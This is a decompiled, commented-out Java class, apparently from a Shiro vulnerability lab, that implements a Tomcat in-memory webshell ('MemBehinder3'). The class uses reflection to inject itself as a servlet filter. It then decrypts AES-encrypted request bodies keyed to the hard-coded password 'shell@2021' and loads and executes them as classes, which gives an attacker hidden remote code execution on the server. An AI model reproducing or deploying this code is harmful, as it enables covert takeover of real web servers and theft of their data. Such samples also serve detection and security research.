/*
package com.shiro.vuln.filter;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;
import java.util.HashMap;

//@WebFilter
public class MemBehinder3 extends ClassLoader implements Filter {
    public String passwd = "shell@2021";
    public String tpath = "/favicon.ico";
    public String cs = "UTF-8";
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;

    public MemBehinder3(ClassLoader var1) {
        super(var1);
    }

    public MemBehinder3() {
    }

    public void init(FilterConfig var1) throws ServletException {
    }

    public static String md5(String var0) {
        String var1 = null;

        try {
            MessageDigest var2 = MessageDigest.getInstance("MD5");
            var2.update(var0.getBytes(), 0, var0.length());
            var1 = (new BigInteger(1, var2.digest())).toString(16).toUpperCase();
        } catch (Exception var4) {
        }

        return var1.substring(0, 16).toLowerCase();
    }

    public Class g(byte[] var1) {
        return super.defineClass(var1, 0, var1.length);
    }

    public void parseObj(Object var1) {
        if (var1.getClass().isArray()) {
            Object[] var2 = (Object[])((Object[])var1);
            this.request = (HttpServletRequest)var2[0];
            this.response = (HttpServletResponse)var2[1];
        } else {
            try {
                Class var3 = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)var3.getDeclaredMethod("getRequest", (Class[])null).invoke(var1, (Object[])null);
                this.response = (HttpServletResponse)var3.getDeclaredMethod("getResponse", (Class[])null).invoke(var1, (Object[])null);
            } catch (Exception var12) {
                if (var1 instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)var1;

                    try {
                        Field var5 = this.request.getClass().getDeclaredField("request");
                        var5.setAccessible(true);
                        HttpServletRequest var6 = (HttpServletRequest)var5.get(this.request);
                        Field var7 = var6.getClass().getDeclaredField("response");
                        var7.setAccessible(true);
                        this.response = (HttpServletResponse)var7.get(var6);
                    } catch (Exception var11) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse", (Class[])null).invoke(var1, (Object[])null);
                        } catch (Exception var10) {
                        }
                    }
                }
            }
        }

    }

    public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
        HttpServletRequest var4 = (HttpServletRequest)var1;
        HttpServletResponse var5 = (HttpServletResponse)var2;
        HttpSession var6 = var4.getSession();
        HashMap var7 = new HashMap();
        var7.put("request", var4);
        var7.put("response", var5);
        var7.put("session", var6);
        System.out.println(111);
        var5.setHeader("inject", "success");
        String var8 = md5(this.passwd);
        var6.putValue("u", var8);

        try {
            Cipher var9 = Cipher.getInstance("AES");
            SecretKeySpec var10 = new SecretKeySpec(var8.getBytes(), "AES");
            var9.init(2, var10);
            String var11 = var4.getReader().readLine();
            Method var12 = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var12.setAccessible(true);
            byte[] var13 = var9.doFinal((new BASE64Decoder()).decodeBuffer(var11));
            Class var14 = (Class)var12.invoke(this.getClass().getClassLoader(), var13, new Integer(0), new Integer(var13.length));
            var14.newInstance().equals(var7);
        } catch (Exception var16) {
            var16.printStackTrace();
        }

        var3.doFilter(var4, var5);
    }

    public void destroy() {
    }

    public static String addFilter(Filter var0, String var1, String var2, HttpServletRequest var3) throws IllegalAccessException {
        ServletContext var4 = var3.getServletContext();
        if (var4.getFilterRegistration(var1) == null) {
            Field var5 = null;
            ApplicationContext var6 = null;
            StandardContext var7 = null;
            Field var8 = null;
            FilterRegistration.Dynamic var9 = null;

            String var10;
            try {
                var5 = var4.getClass().getDeclaredField("context");
                var5.setAccessible(true);
                var6 = (ApplicationContext)var5.get(var4);
                var5 = var6.getClass().getDeclaredField("context");
                var5.setAccessible(true);
                var7 = (StandardContext)var5.get(var6);
                var8 = LifecycleBase.class.getDeclaredField("state");
                var8.setAccessible(true);
                var8.set(var7, LifecycleState.STARTING_PREP);
                var9 = var4.addFilter(var1, var0);
                var9.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{var2});
                Method var11 = StandardContext.class.getMethod("filterStart", (Class[])null);
                var11.setAccessible(true);
                var11.invoke(var7, (Object[])null);
                var8.set(var7, LifecycleState.STARTED);
                var10 = null;

                Class var12;
                try {
                    var12 = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var26) {
                    var12 = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                if (var12 != null) {
                    Method var14 = var7.getClass().getMethod("findFilterMaps", (Class[])null);
                    Object[] var15 = (Object[])var14.invoke(var7, (Object[])null);
                    Object[] var16 = new Object[var15.length];
                    int var17 = 1;

                    for(int var18 = 0; var18 < var15.length; ++var18) {
                        Object var19 = var15[var18];
                        var14 = var12.getMethod("getFilterName", (Class[])null);
                        String var20 = (String)var14.invoke(var19, (Object[])null);
                        if (var20.equalsIgnoreCase(var20)) {
                            var16[0] = var19;
                        } else {
                            var16[var17++] = var15[var18];
                        }
                    }

                    System.arraycopy(var16, 0, var15, 0, var15.length);
                }

                String var21 = "inject success";
                return var21;
            } catch (Exception var27) {
                var10 = var27.getMessage();
            } finally {
                var8.set(var7, LifecycleState.STARTED);
            }

            return var10;
        } else {
            return "Filter already exists";
        }
    }

    public boolean equals(Object var1) {
        this.parseObj(var1);
        StringBuffer var2 = new StringBuffer();
        String var3 = "->|";
        String var4 = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            var2.append(addFilter(this, "MemBehinder387532587899179", "this.tpath", this.request));
        } catch (Exception var8) {
            var2.append("ERROR:// " + var8.toString());
        }

        try {
            this.response.getWriter().print(var3 + var2.toString() + var4);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var7) {
        }

        return true;
    }
}
*/
